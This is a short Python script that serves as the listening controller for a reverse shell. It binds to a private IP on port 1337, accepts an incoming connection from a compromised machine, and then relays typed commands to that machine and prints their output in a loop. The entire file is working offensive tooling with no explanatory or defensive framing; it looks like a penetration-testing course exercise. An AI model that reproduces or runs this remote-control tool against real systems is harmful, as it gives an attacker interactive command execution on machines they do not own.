#!/user/bin/env python
import socket
import errno


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection.\n")
        self.connection, address = listener.accept()
        print("\n[+] Got a connection.\n", str(address))

    def execute(self, command):
        try:
            self.connection.send(command.encode("utf-8"))
        except IOError as e:
            if e.errno == errno.EPIPE:
                print("Something is error!" + str(e))
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute(command)
            print(result.decode("utf-8"))


listener = Listener("192.168.146.149", 1337)
listener.run()
